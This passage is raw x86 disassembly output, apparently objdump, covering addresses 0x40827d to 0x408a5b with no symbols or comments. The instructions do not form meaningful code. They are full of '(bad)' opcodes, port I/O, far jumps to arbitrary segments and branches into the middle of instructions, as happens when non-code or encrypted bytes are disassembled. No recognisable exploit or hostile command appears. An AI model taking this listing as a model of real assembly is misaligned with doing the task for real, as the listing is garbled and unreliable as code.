  40827d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40827e:	push   edi
  40827f:	in     eax,dx
  408280:	add    al,0x7e
  408282:	push   0x26181b7d
  408287:	sbb    eax,0xb2ad9ea8
  40828c:	mov    edi,0xc2fdef20
  408291:	sbb    DWORD PTR [eax-0x4e],ecx
  408294:	dec    ebp
  408295:	rcl    DWORD PTR [esi],0xe2
  408298:	sub    al,0x49
  40829a:	bswap  edi
  40829c:	ins    BYTE PTR es:[edi],dx
  40829d:	or     dl,0x3a
  4082a0:	rol    BYTE PTR [ebp-0x7e0155f0],0x9f
  4082a7:	ja     0x408253
  4082a9:	or     eax,0x5d73b42d
  4082ae:	sar    BYTE PTR [ecx],0xdd
  4082b1:	inc    eax
  4082b2:	in     al,0x8b
  4082b4:	or     eax,ebx
  4082b6:	sbb    esp,DWORD PTR [esi-0x66]
  4082b9:	dec    edi
  4082ba:	mov    ebp,0xb6d7ad82
  4082bf:	push   ebx
  4082c0:	dec    esp
  4082c1:	ret    
  4082c2:	mov    eax,ds:0xea5e67c3
  4082c7:	icebp  
  4082c8:	push   ebx
  4082c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ca:	(bad)  
  4082cc:	shl    BYTE PTR [ecx],1
  4082ce:	sbb    ebx,DWORD PTR [edi+0x7d50bd7f]
  4082d4:	adc    ch,BYTE PTR [eax+0x12acd9e]
  4082da:	test   eax,0x6b2907ee
  4082df:	imul   BYTE PTR [edi]
  4082e1:	call   DWORD PTR [edx+0x6eee5890]
  4082e7:	gs jmp 0x937a:0x6147d4f5
  4082ef:	and    BYTE PTR [esp+eiz*4-0x15c47a4e],dh
  4082f6:	and    eax,0xc7d73b9
  4082fb:	in     eax,dx
  4082fc:	push   edx
  4082fd:	int3   
  4082fe:	sar    ah,0x35
  408301:	jmp    0x408291
  408303:	mov    edi,0x76fb304c
  408308:	jmp    0x7fb588d6
  40830d:	or     al,0xde
  40830f:	adc    edx,esi
  408311:	and    eax,0x9fac3720
  408316:	jmp    0xd29239c2
  40831b:	jg     0x40835e
  40831d:	inc    ebx
  40831e:	leave  
  40831f:	jl     0x40834c
  408321:	sbb    ch,BYTE PTR [ecx-0x5e2ea9fe]
  408327:	out    0xd2,eax
  408329:	test   al,0x9d
  40832b:	leave  
  40832c:	test   BYTE PTR [edi],ah
  40832e:	sbb    DWORD PTR [ebp-0x4e],esp
  408331:	(bad)  
  408332:	aam    0x42
  408334:	cmp    ch,BYTE PTR [eax]
  408336:	adc    al,0xee
  408338:	sub    bh,BYTE PTR [eax+0x279f36e5]
  40833e:	mov    ch,0xd6
  408340:	(bad)  
  408341:	ins    DWORD PTR es:[edi],dx
  408342:	push   ds
  408343:	mov    ah,0x92
  408345:	js     0x4083bc
  408347:	imul   esi,DWORD PTR ds:0xf286985b,0x49
  40834e:	jge    0x40831c
  408350:	inc    ecx
  408351:	fnstenv es:[ebx+ecx*4+0x1c]
  408356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408357:	or     esi,DWORD PTR ds:0x38cb2c95
  40835d:	mov    bh,0x7b
  40835f:	out    0x2c,al
  408361:	aas    
  408362:	and    eax,0x4bdfd053
  408367:	push   cs
  408368:	mov    al,0xeb
  40836a:	out    0x1c,eax
  40836c:	icebp  
  40836d:	dec    ecx
  40836e:	adc    eax,0xe0a8e5e5
  408373:	dec    ebx
  408374:	cdq    
  408375:	and    DWORD PTR [ecx],ebx
  408377:	shr    BYTE PTR [ecx],0x8a
  40837a:	dec    ebp
  40837b:	xchg   BYTE PTR [edx-0x3e],cl
  40837e:	aad    0x30
  408380:	mov    ebx,0x78dd1e71
  408385:	test   DWORD PTR [esi],ebx
  408387:	jecxz  0x408398
  408389:	out    dx,eax
  40838a:	xchg   BYTE PTR [edx],ah
  40838c:	inc    edi
  40838d:	popf   
  40838e:	ret    0xb4f7
  408391:	sti    
  408392:	ja     0x408365
  408394:	jmp    0xb1e5:0xd4ee253f
  40839b:	xchg   ecx,eax
  40839c:	and    al,0x56
  40839e:	sub    DWORD PTR [ebx],esp
  4083a0:	and    al,0x2
  4083a2:	or     edx,DWORD PTR [edx+0x29]
  4083a5:	xor    BYTE PTR [esi-0x29],dh
  4083a8:	loop   0x408356
  4083aa:	hlt    
  4083ab:	push   0xf18a9df6
  4083b0:	sbb    eax,0x54c28532
  4083b5:	test   DWORD PTR [edx-0x31],esp
  4083b8:	gs inc eax
  4083ba:	mov    BYTE PTR [edi+0x75549481],bl
  4083c0:	push   0xa7fe4dca
  4083c5:	mov    WORD PTR [edx-0x5fc068f9],es
  4083cb:	cs mov ecx,0x11937f9e
  4083d1:	push   ss
  4083d2:	repz jle 0x4083ee
  4083d5:	imul   edx,DWORD PTR [ecx],0x4c
  4083d8:	sub    BYTE PTR [ebp-0x4f],ah
  4083db:	ins    DWORD PTR es:[edi],dx
  4083dc:	cmp    bl,dh
  4083de:	sbb    DWORD PTR [esi+eiz*8],eax
  4083e1:	add    al,0xcc
  4083e3:	(bad)  
  4083e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083e5:	mul    ch
  4083e7:	rcl    DWORD PTR [ebp+0x62],0x8e
  4083eb:	add    BYTE PTR [ebx+0x2bca5965],0xbb
  4083f2:	inc    ebx
  4083f3:	lods   eax,DWORD PTR ds:[esi]
  4083f4:	ror    BYTE PTR [edx-0x1ce81039],0x4c
  4083fb:	push   0xbf255478
  408400:	cs pop ss
  408402:	xor    edi,ebx
  408404:	add    al,0x1e
  408406:	inc    ecx
  408407:	inc    ecx
  408408:	pop    edx
  408409:	xchg   edi,eax
  40840a:	push   ds
  40840b:	mov    ebx,0x33246321
  408410:	and    eax,0xa8931aab
  408415:	push   ss
  408416:	hlt    
  408417:	add    ebx,DWORD PTR [eax-0x7494cab9]
  40841d:	ins    DWORD PTR es:[edi],dx
  40841e:	mov    edx,0x5c7b1c4e
  408423:	in     eax,dx
  408424:	inc    esi
  408425:	retf   
  408426:	shl    BYTE PTR [ebx+0x4e53e127],0x47
  40842d:	xchg   esi,eax
  40842e:	mov    dh,0x27
  408430:	dec    esp
  408431:	dec    edi
  408432:	ficomp WORD PTR [eax-0x6b]
  408435:	jmp    0x72b4:0x79e9a1d3
  40843c:	(bad)  
  40843d:	lods   eax,DWORD PTR ds:[esi]
  40843e:	adc    BYTE PTR [edi+ebp*2+0x7b],0xdc
  408443:	bound  ebx,QWORD PTR [ebx-0x3b]
  408446:	(bad)  
  408448:	retf   0xf184
  40844b:	test   DWORD PTR [eax+ebx*1-0x3cbe945],esi
  408452:	enter  0x28fb,0xee
  408456:	fisttp QWORD PTR [ebx]
  408458:	es data16 mov ss:0x5e019a54,al
  408460:	dec    ebx
  408461:	mov    edi,0xb356c346
  408466:	std    
  408467:	(bad)  
  408468:	jle    0x4083f3
  40846a:	(bad)  
  40846b:	imul   ebp,DWORD PTR ds:0xbe244473,0xe91b2b1c
  408475:	dec    esi
  408476:	shl    BYTE PTR [esi-0xe],1
  408479:	adc    al,0xd2
  40847b:	mov    esp,DWORD PTR [ecx+0x525bf50d]
  408481:	ror    DWORD PTR [ecx+ebx*1],0x8a
  408485:	aad    0x47
  408487:	daa    
  408488:	jmp    0x669b:0xd8e2dbdb
  40848f:	cmp    eax,0x60d0950d
  408494:	or     ebx,ebx
  408496:	rcr    BYTE PTR [eax],0xed
  408499:	lods   al,BYTE PTR ds:[esi]
  40849a:	test   BYTE PTR [ebp+0x6acc1cc1],dl
  4084a0:	dec    ebp
  4084a1:	jo     0x408488
  4084a3:	and    eax,0x3af8aabb
  4084a8:	rcr    DWORD PTR [eax-0x4716a6ba],cl
  4084ae:	in     al,dx
  4084af:	push   edx
  4084b0:	jl     0x408484
  4084b2:	jp     0x4084b2
  4084b4:	mov    ds:0x2a3b9c6f,al
  4084b9:	dec    esp
  4084ba:	push   0xe82ab11
  4084bf:	sbb    ch,BYTE PTR [edx-0x55a67835]
  4084c5:	pop    ebp
  4084c6:	outs   dx,BYTE PTR ds:[esi]
  4084c7:	cmp    DWORD PTR [ecx],ebx
  4084c9:	mov    esp,edx
  4084cb:	sbb    BYTE PTR [ecx-0x1e7f8619],ch
  4084d1:	pop    ecx
  4084d2:	inc    ebp
  4084d3:	rcr    DWORD PTR fs:[ebx+eax*8-0x79ecb673],cl
  4084db:	(bad)  
  4084dc:	fist   DWORD PTR [ebx]
  4084de:	jb     0x4084ea
  4084e0:	sub    bh,BYTE PTR [eax-0x348e3a7e]
  4084e6:	lods   al,BYTE PTR ds:[esi]
  4084e7:	mov    bl,0xf5
  4084e9:	jns    0x408554
  4084eb:	fld    st(7)
  4084ed:	in     eax,0xa0
  4084ef:	jmp    0x4084a2
  4084f1:	mov    ecx,0xde60d257
  4084f6:	or     DWORD PTR [ebx+eax*1+0x54],esp
  4084fa:	pop    ecx
  4084fb:	pop    esi
  4084fc:	mov    dl,0xd3
  4084fe:	mov    bh,0x46
  408500:	sbb    BYTE PTR [esi+0x8],cl
  408503:	jae    0x4084dc
  408505:	fcomp  DWORD PTR [edx]
  408507:	cmp    eax,0xcded89e
  40850c:	lds    edx,FWORD PTR [eax]
  40850e:	and    dl,BYTE PTR [eax+ebp*8+0x7b749c60]
  408515:	pop    es
  408516:	inc    ebx
  408517:	add    DWORD PTR [ebp+0x17f866ea],esp
  40851d:	test   al,0x86
  40851f:	add    BYTE PTR [edx-0x70c69472],0x61
  408526:	xchg   ecx,eax
  408527:	pop    eax
  408528:	repz inc esi
  40852a:	dec    ecx
  40852b:	imul   ebx,DWORD PTR [eax-0x2a49df5c],0xa6b5e0c6
  408535:	es retf 0x754c
  408539:	dec    edi
  40853a:	cmp    dl,BYTE PTR [esi-0x56]
  40853d:	jnp    0x408544
  40853f:	iret   
  408540:	mov    al,BYTE PTR [edi-0x11]
  408543:	addr16 aad 0x44
  408546:	pop    edx
  408547:	cmp    eax,esp
  408549:	mov    al,BYTE PTR [eax+0x5ecafb54]
  40854f:	and    ebx,ecx
  408551:	sbb    BYTE PTR [eax+0x79956f26],0x32
  408558:	(bad)  
  408559:	jmp    0x4084e3
  40855b:	jmp    0xc1fb9e11
  408560:	out    0xd7,eax
  408562:	mov    al,0x35
  408564:	xor    BYTE PTR ds:0xaa3c07ca,al
  40856a:	clc    
  40856b:	adc    BYTE PTR [ecx-0x64],ch
  40856e:	lahf   
  40856f:	jns    0x40858e
  408571:	neg    BYTE PTR [ebx]
  408573:	pop    es
  408574:	adc    al,0x5e
  408576:	pushf  
  408577:	cmp    eax,0x26e76735
  40857c:	add    ch,al
  40857e:	adc    edi,esi
  408580:	add    DWORD PTR [edi+0x64ccb419],ebx
  408586:	outs   dx,BYTE PTR ds:[esi]
  408587:	cmc    
  408588:	dec    esi
  408589:	dec    esp
  40858a:	stos   DWORD PTR es:[edi],eax
  40858b:	aam    0x48
  40858d:	inc    ecx
  40858e:	adc    DWORD PTR [esi-0x2f],0x18
  408592:	sbb    BYTE PTR [ecx-0x4b5335ae],cl
  408598:	in     eax,0x5c
  40859a:	cmp    edx,DWORD PTR [edi+0x7]
  40859d:	dec    edi
  40859e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40859f:	adc    al,bl
  4085a1:	mov    al,ds:0xc47820f0
  4085a6:	push   ecx
  4085a7:	in     al,0xe4
  4085a9:	mov    bl,0xa6
  4085ab:	mov    ds:0xeddedb48,al
  4085b0:	mov    dh,0x5e
  4085b2:	jle    0x408578
  4085b4:	mov    esi,0xfc1a1e1d
  4085b9:	cmp    BYTE PTR [ecx],al
  4085bb:	mov    ecx,0x61a4ba7f
  4085c0:	push   ebx
  4085c1:	(bad)  
  4085c2:	fadd   QWORD PTR [ebx]
  4085c4:	ret    0xb5e0
  4085c7:	jecxz  0x40862c
  4085c9:	or     BYTE PTR [eax+0x43bfe692],ch
  4085cf:	xchg   ebp,eax
  4085d0:	stc    
  4085d1:	xor    DWORD PTR ds:0x1f75b186,ebx
  4085d7:	adc    BYTE PTR [eax+0x3d],0x28
  4085db:	pop    es
  4085dc:	out    dx,eax
  4085dd:	ret    
  4085de:	inc    ebx
  4085df:	out    0x6f,al
  4085e1:	jmp    0x5bdddca4
  4085e6:	(bad)  
  4085e7:	retf   
  4085e8:	xor    bh,BYTE PTR [ebx]
  4085ea:	sub    cl,BYTE PTR [ebp+0xde59ed2]
  4085f0:	je     0x408608
  4085f2:	add    DWORD PTR [ecx],edx
  4085f4:	fisttp WORD PTR [esi]
  4085f6:	xor    eax,DWORD PTR [ebx]
  4085f8:	add    edi,0xfffffff6
  4085fb:	dec    ebp
  4085fc:	fadd   DWORD PTR [edx+0x2]
  4085ff:	sub    DWORD PTR [eax+ecx*2+0x25ca71fd],0xffffffbf
  408607:	test   ebx,0xa5371ccc
  40860d:	sub    DWORD PTR ds:0x95c6b8e0,edi
  408613:	lahf   
  408614:	pusha  
  408615:	fcomp  DWORD PTR [edi+eiz*1]
  408618:	neg    DWORD PTR [ecx+0x67]
  40861b:	je     0x408612
  40861d:	fcomp  DWORD PTR [esi+0x47186396]
  408623:	fbld   TBYTE PTR [ecx+0x76]
  408626:	popa   
  408627:	shr    BYTE PTR [eax+edi*1],cl
  40862a:	lods   al,BYTE PTR ds:[esi]
  40862b:	daa    
  40862c:	pop    esi
  40862d:	rcr    BYTE PTR [ecx+edi*4],cl
  408630:	cmp    eax,0x1a6aedca
  408635:	or     DWORD PTR [ebx-0xe8a72f8],esp
  40863b:	lahf   
  40863c:	aas    
  40863d:	or     eax,0xd56cc273
  408642:	cmp    eax,0xfa23c184
  408647:	scas   al,BYTE PTR es:[edi]
  408648:	lock mov edi,0xd1c68974
  40864e:	pop    eax
  40864f:	dec    DWORD PTR [edi-0x2]
  408652:	into   
  408653:	daa    
  408654:	and    DWORD PTR [edi+ebx*1-0x3627e684],eax
  40865b:	mov    cl,0x55
  40865d:	arpl   WORD PTR [ebp+0x51],di
  408660:	inc    esi
  408661:	jg     0x40860a
  408663:	(bad)  
  408664:	mov    eax,ds:0x8c66d7ff
  408669:	mov    edx,0xaf06ee4b
  40866e:	and    DWORD PTR [esi-0x23fb7631],0xfffffff7
  408675:	out    0x2c,eax
  408677:	xor    ebp,DWORD PTR [edx+0x59]
  40867a:	jmp    0x91d768b2
  40867f:	cmp    esp,ecx
  408681:	jno    0x408672
  408683:	sbb    eax,0xd47c87e0
  408688:	js     0x4086ac
  40868a:	test   al,0x79
  40868c:	das    
  40868d:	cmp    DWORD PTR [esi-0x3fb5f567],ebx
  408693:	retf   
  408694:	fcmovb st,st(4)
  408696:	in     al,dx
  408697:	xchg   edi,eax
  408698:	int    0xa0
  40869a:	mov    dl,0x61
  40869c:	jp     0x40869e
  40869e:	mov    cl,0xae
  4086a0:	mov    cl,0x34
  4086a2:	or     al,BYTE PTR [ebx]
  4086a4:	xchg   edx,eax
  4086a5:	or     eax,0xf4ab2089
  4086aa:	bswap  ecx
  4086ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086ad:	aaa    
  4086ae:	scas   eax,DWORD PTR es:[edi]
  4086af:	dec    esp
  4086b0:	pop    ebp
  4086b1:	xchg   esp,eax
  4086b2:	fld    QWORD PTR [edi+0xe]
  4086b5:	les    eax,FWORD PTR [ecx+0x38d6962]
  4086bb:	cli    
  4086bc:	mov    al,BYTE PTR [edi+0x70c5bf06]
  4086c2:	in     eax,0xbb
  4086c4:	jnp    0x408689
  4086c6:	leave  
  4086c7:	cmp    al,0xc7
  4086c9:	xor    esp,DWORD PTR [ebx+0x3e]
  4086cc:	inc    eax
  4086cd:	mov    bl,0x23
  4086cf:	mov    ds:0xb8a418b7,eax
  4086d4:	retf   
  4086d5:	sub    DWORD PTR [edx],esp
  4086d7:	mov    ds:0x545b8515,eax
  4086dc:	inc    ebx
  4086dd:	cmp    bh,dh
  4086df:	xlat   BYTE PTR ds:[ebx]
  4086e0:	inc    esp
  4086e1:	nop
  4086e2:	lock mov ebp,0x8ee1069a
  4086e8:	mov    edi,edi
  4086ea:	dec    ecx
  4086eb:	imul   ebp,DWORD PTR [ecx],0x15bc47e
  4086f1:	mov    ah,0x2d
  4086f3:	inc    eax
  4086f4:	fisttp DWORD PTR [edi+eax*1+0x26]
  4086f8:	mov    ch,0xbb
  4086fa:	sbb    cl,BYTE PTR [edi]
  4086fc:	adc    eax,0xc027eeb0
  408701:	mov    esp,0x4335e78a
  408706:	push   ebp
  408707:	ficomp WORD PTR [ebx]
  408709:	and    eax,0xf14c1d93
  40870e:	shl    DWORD PTR [edx],0x68
  408711:	sbb    dl,BYTE PTR [edi+0x35]
  408714:	popf   
  408715:	lods   al,BYTE PTR ds:[esi]
  408716:	ja     0x4086ec
  408718:	adc    ah,ch
  40871a:	shl    DWORD PTR [eax+0x1992d099],cl
  408720:	jbe    0x4086ec
  408722:	xor    bl,BYTE PTR [edx+0xd]
  408725:	sbb    bl,BYTE PTR [ebx]
  408727:	inc    ebx
  408728:	push   eax
  408729:	std    
  40872a:	loopne 0x4087a8
  40872c:	fwait
  40872d:	push   es
  40872e:	xor    eax,DWORD PTR [eax]
  408730:	cmp    al,BYTE PTR [edx+eax*1]
  408733:	xor    al,BYTE PTR [edi]
  408735:	mov    ds:0x802ebb59,eax
  40873a:	mov    dl,0xfd
  40873c:	iret   
  40873d:	xor    al,0x30
  40873f:	retf   
  408740:	faddp  st(2),st
  408742:	loope  0x40875c
  408744:	inc    edx
  408745:	or     eax,0x840ef7
  40874a:	and    eax,0xe3bb87d5
  40874f:	gs cld 
  408751:	out    dx,al
  408752:	das    
  408753:	xor    bl,BYTE PTR [eax]
  408755:	lods   eax,DWORD PTR ds:[esi]
  408756:	push   ebx
  408757:	sbb    ecx,esi
  408759:	or     al,0x21
  40875b:	push   edx
  40875c:	push   ecx
  40875d:	dec    esi
  40875e:	mov    cl,0x9b
  408760:	pop    ebx
  408761:	scas   al,BYTE PTR es:[edi]
  408762:	jns    0x40872f
  408764:	cmc    
  408765:	imul   eax,edi,0xffffffb2
  408768:	mov    bh,0xa4
  40876a:	ret    
  40876b:	xchg   BYTE PTR [esi-0xf],dl
  40876e:	sar    BYTE PTR [eax+0x8ea603c],1
  408774:	inc    esi
  408775:	mov    al,ds:0xaca355c3
  40877a:	ror    al,0x66
  40877d:	jmp    0x6139:0x86f453e8
  408784:	retf   0x5d3d
  408787:	and    al,0xc9
  408789:	cmp    eax,0xad61a077
  40878e:	mov    ecx,0x3e57b618
  408793:	retf   
  408794:	shl    DWORD PTR [edx],cl
  408796:	jo     0x40879a
  408798:	retf   0xfe40
  40879b:	sar    BYTE PTR [eax+0xc],0xa6
  40879f:	dec    edi
  4087a0:	jl     0x408806
  4087a2:	out    0x1a,eax
  4087a4:	test   BYTE PTR [ecx],bl
  4087a6:	and    eax,DWORD PTR [eax+0x15]
  4087a9:	jge    0x408800
  4087ab:	das    
  4087ac:	adc    esi,DWORD PTR [eax]
  4087ae:	pushf  
  4087af:	cvttps2pi mm5,QWORD PTR [eax+0x77]
  4087b3:	out    0x92,al
  4087b5:	add    edx,DWORD PTR [ebx+0x1460bcb8]
  4087bb:	push   edi
  4087bc:	lock clc 
  4087be:	stos   DWORD PTR es:[edi],eax
  4087bf:	or     BYTE PTR [ecx],dl
  4087c1:	lock sbb DWORD PTR ds:[esi],edi
  4087c5:	inc    esi
  4087c6:	test   ch,ch
  4087c8:	pop    edi
  4087c9:	add    eax,0x814b392a
  4087ce:	dec    eax
  4087cf:	jb     0x408785
  4087d1:	ret    
  4087d2:	push   ds
  4087d3:	ror    DWORD PTR [esi-0x67b9df12],cl
  4087d9:	lahf   
  4087da:	dec    edx
  4087db:	xchg   edi,eax
  4087dc:	and    eax,0xedf18f20
  4087e1:	sahf   
  4087e2:	xchg   ebp,eax
  4087e3:	xchg   bh,ch
  4087e5:	xor    ebp,esp
  4087e7:	ret    
  4087e8:	out    0xc4,al
  4087ea:	enter  0xc025,0xcc
  4087ee:	in     al,0xc7
  4087f0:	sub    ah,al
  4087f2:	pop    edx
  4087f3:	fnstenv [edi+ebp*1-0x37]
  4087f7:	ins    DWORD PTR es:[edi],dx
  4087f8:	popa   
  4087f9:	aam    0xe1
  4087fb:	pusha  
  4087fc:	popa   
  4087fd:	dec    ebx
  4087fe:	cmp    ebp,DWORD PTR [esi]
  408800:	enter  0x5cbd,0x94
  408804:	loope  0x40885c
  408806:	sbb    esi,edi
  408808:	fbstp  TBYTE PTR [eax+0x7d]
  40880b:	or     cl,BYTE PTR ds:[edx]
  40880e:	pop    es
  40880f:	popa   
  408810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408811:	jle    0x408810
  408813:	xor    BYTE PTR [esi-0x4e],bl
  408816:	scas   al,BYTE PTR es:[edi]
  408817:	add    dh,BYTE PTR [edx]
  408819:	inc    edi
  40881a:	and    eax,0x8eea03a
  40881f:	sbb    ebp,edx
  408821:	mov    eax,ds:0x8794d44
  408826:	push   ds
  408827:	iret   
  408828:	sar    DWORD PTR [edi-0x62],cl
  40882b:	or     dh,BYTE PTR [ebp+ecx*2+0x5a]
  40882f:	or     DWORD PTR ds:0x1f55f50f,edi
  408835:	test   eax,0xdbf48466
  40883a:	xchg   ecx,eax
  40883b:	sbb    al,0x86
  40883d:	mov    ds:0xca9c39e8,eax
  408842:	pop    edx
  408843:	cmp    ah,bh
  408845:	jmp    0x8df1:0x17be22a7
  40884c:	sbb    DWORD PTR [eax+edx*2+0x2e],ecx
  408850:	cmp    DWORD PTR [edi-0x10e9db8b],eax
  408856:	cmp    al,0x53
  408858:	fwait
  408859:	imul   ecx,DWORD PTR [ebx+eax*8-0x2c27db8b],0x1c4cf69e
  408864:	sar    DWORD PTR [esi+ebp*4],cl
  408867:	sub    edx,DWORD PTR [eax-0x3d5e97b8]
  40886d:	rcl    BYTE PTR [ebp+ebx*2+0x56],cl
  408871:	out    0x36,al
  408873:	push   ds
  408874:	fs jmp 0x4087fc
  408877:	sbb    ch,bl
  408879:	mov    DWORD PTR [eax],ebp
  40887b:	and    al,0x7b
  40887d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40887e:	retf   0x7624
  408881:	sbb    ch,BYTE PTR [ebp-0x666edf47]
  408887:	jae    0x40882f
  408889:	leave  
  40888a:	pop    ss
  40888b:	int3   
  40888c:	xchg   edi,eax
  40888d:	in     al,dx
  40888e:	xor    eax,0xe6060eb3
  408893:	bound  edi,QWORD PTR [edi]
  408895:	test   eax,0x29657af
  40889a:	gs into 
  40889c:	jbe    0x4088d3
  40889e:	mov    edi,0x3ef9a961
  4088a3:	test   cl,dh
  4088a5:	sbb    ch,al
  4088a7:	pop    es
  4088a8:	mov    bl,0xd3
  4088aa:	xor    bl,bh
  4088ac:	xlat   BYTE PTR ds:[ebx]
  4088ad:	sub    BYTE PTR [eax+eax*4],dh
  4088b0:	dec    eax
  4088b1:	dec    edi
  4088b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b3:	pop    ebp
  4088b4:	and    edx,eax
  4088b6:	shl    BYTE PTR [eax-0x59f5b7ed],0x21
  4088bd:	mov    dl,0xba
  4088bf:	aaa    
  4088c0:	rcl    DWORD PTR [edx],0xd
  4088c3:	xchg   BYTE PTR [edi+0x49],al
  4088c6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4088c8:	pop    eax
  4088c9:	imul   esi,edx,0xffffffb8
  4088cc:	xchg   ecx,eax
  4088cd:	push   cs
  4088ce:	(bad)  
  4088cf:	mov    esp,DWORD PTR [ecx+0x30]
  4088d2:	jp     0x408882
  4088d4:	test   DWORD PTR [ebp+ecx*1-0x63],esp
  4088d8:	hlt    
  4088d9:	xchg   ebx,eax
  4088da:	pop    es
  4088db:	sub    BYTE PTR [ecx-0x55a4c32f],0x57
  4088e2:	loop   0x40890e
  4088e4:	push   esp
  4088e5:	inc    ebp
  4088e6:	jmp    0x89261c8d
  4088eb:	mov    ah,0x2b
  4088ed:	xchg   ebp,eax
  4088ee:	dec    ebx
  4088ef:	mov    cl,0x5
  4088f1:	xchg   edi,eax
  4088f2:	ins    DWORD PTR es:[edi],dx
  4088f3:	xchg   edx,ebx
  4088f5:	xchg   edx,eax
  4088f6:	push   cs
  4088f7:	push   ss
  4088f8:	repz fild DWORD PTR [ecx+esi*4-0x248a47d3]
  408900:	jmp    0x591b:0xa5e6da8e
  408907:	sub    BYTE PTR [ebx],ah
  408909:	push   es
  40890a:	xchg   ecx,eax
  40890b:	pop    ds
  40890c:	xchg   ebp,eax
  40890d:	jbe    0x408892
  40890f:	inc    ebx
  408910:	retf   
  408911:	inc    edx
  408912:	push   0x675095fa
  408917:	xchg   edi,eax
  408918:	aaa    
  408919:	cs ja  0x4088b2
  40891c:	ficom  WORD PTR [edx-0x5b]
  40891f:	fisub  DWORD PTR [ecx]
  408921:	hlt    
  408922:	pop    ebx
  408923:	in     al,0xa2
  408925:	cli    
  408926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408927:	xor    al,dh
  408929:	lods   eax,DWORD PTR ds:[esi]
  40892a:	sbb    DWORD PTR [ecx-0x4d],edx
  40892d:	scas   eax,DWORD PTR es:[edi]
  40892e:	xchg   esi,eax
  40892f:	hlt    
  408930:	pop    esp
  408931:	mov    esi,0x5f350eaf
  408936:	outs   dx,DWORD PTR ds:[esi]
  408937:	fsubr  DWORD PTR [eax+0x76]
  40893a:	sbb    ebx,DWORD PTR [eax+0x261eb191]
  408940:	mov    dl,0x59
  408942:	popa   
  408943:	dec    esi
  408944:	jbe    0x4088ce
  408946:	gs cld 
  408948:	jns    0x4089b2
  40894a:	stos   DWORD PTR es:[edi],eax
  40894b:	jmp    0x408930
  40894d:	push   0xffffff9b
  40894f:	neg    DWORD PTR [eax-0x73760269]
  408955:	mov    eax,ds:0x1915993a
  40895a:	cmp    eax,0xdc833696
  40895f:	jmp    0xcd30:0x15719ab1
  408966:	test   al,0xcb
  408968:	fnstcw WORD PTR [ebx+0x73]
  40896b:	scas   al,BYTE PTR es:[edi]
  40896c:	je     0x408903
  40896e:	and    eax,DWORD PTR [edi-0x1c57eac4]
  408974:	ret    0xe5c2
  408977:	out    0x12,al
  408979:	lds    edi,FWORD PTR [edx]
  40897b:	mov    bh,0xd
  40897d:	and    eax,DWORD PTR [eax]
  40897f:	fcmovne st,st(3)
  408981:	xor    al,0x40
  408983:	mov    cl,BYTE PTR [ebp+0x2514a959]
  408989:	je     0x408997
  40898b:	mov    esp,0x7fc7999c
  408990:	sub    BYTE PTR [eax],bh
  408992:	out    dx,al
  408993:	push   ss
  408994:	add    DWORD PTR [eax-0x5b52d16f],esp
  40899a:	(bad)  
  40899b:	out    0x61,al
  40899d:	das    
  40899e:	cmc    
  40899f:	pop    ecx
  4089a0:	lds    ebp,FWORD PTR [esi-0x34]
  4089a3:	aaa    
  4089a4:	xor    ch,al
  4089a6:	adc    BYTE PTR ds:0x23267faf,0xe9
  4089ad:	or     ebx,DWORD PTR ds:0x39eba91
  4089b3:	fild   DWORD PTR [ebx+0x52872fb2]
  4089b9:	inc    edx
  4089ba:	add    bl,BYTE PTR [bx-0x61]
  4089be:	ja     0x408a09
  4089c0:	push   esi
  4089c1:	push   edx
  4089c2:	ss pushf 
  4089c4:	add    al,0x2a
  4089c6:	outs   dx,BYTE PTR ds:[esi]
  4089c7:	fmul   DWORD PTR [esi]
  4089c9:	mov    ecx,0xf8e13a83
  4089ce:	jmp    0x4089d0
  4089d0:	scas   eax,DWORD PTR es:[edi]
  4089d1:	imul   eax,DWORD PTR [edx-0x46],0x53
  4089d5:	das    
  4089d6:	add    eax,0xeb6da769
  4089db:	sub    al,0x76
  4089dd:	cmp    ah,BYTE PTR [ecx+ebx*8+0x33a77c53]
  4089e4:	pop    esp
  4089e5:	mov    ebp,0xcf7c2cbb
  4089ea:	(bad)  
  4089eb:	es mov cl,0x34
  4089ee:	pop    esp
  4089ef:	(bad)  
  4089f0:	loopne 0x4089ac
  4089f2:	fcom   QWORD PTR [edx+0x10]
  4089f5:	xchg   edi,eax
  4089f6:	es sub eax,0x4935f78f
  4089fc:	mov    DWORD PTR [ebx+0x2b6e4ab6],esp
  408a02:	fwait
  408a03:	push   esi
  408a04:	push   ebx
  408a05:	pop    es
  408a06:	add    esi,edx
  408a08:	cmp    al,0x4c
  408a0a:	mov    cl,0x35
  408a0c:	jg     0x40899b
  408a0e:	pop    ds
  408a0f:	scas   al,BYTE PTR es:[edi]
  408a10:	mov    dh,0xb8
  408a12:	push   ss
  408a13:	test   DWORD PTR [ecx-0x7a],0xfd1c00c6
  408a1a:	in     eax,0xe1
  408a1c:	nop
  408a1d:	sbb    bl,BYTE PTR [ecx]
  408a1f:	xchg   ecx,eax
  408a20:	or     cl,BYTE PTR ds:[edi-0x13]
  408a24:	fs es sbb edi,edi
  408a28:	xchg   esp,eax
  408a29:	outs   dx,BYTE PTR ds:[esi]
  408a2a:	dec    edi
  408a2b:	fmul   QWORD PTR [eax]
  408a2d:	out    0x65,eax
  408a2f:	test   DWORD PTR [edi+0x47155995],eax
  408a35:	and    BYTE PTR [esi-0x75ebda7d],ch
  408a3b:	js     0x408a52
  408a3d:	inc    esi
  408a3e:	inc    ebp
  408a3f:	or     edi,DWORD PTR [ebp-0x2b]
  408a42:	inc    ecx
  408a43:	test   BYTE PTR [edi+0x3e9167f4],cl
  408a49:	mov    cl,0x78
  408a4b:	popf   
  408a4c:	int3   
  408a4d:	jle    0x408a8c
  408a4f:	xchg   edx,eax
  408a50:	stos   BYTE PTR es:[edi],al
  408a51:	jp     0x408a79
  408a53:	push   ecx
  408a54:	int3   
  408a55:	addr16 xchg ecx,eax
  408a57:	aad    0x75
  408a59:	add    ebx,esp
  408a5b:	pop    ebx
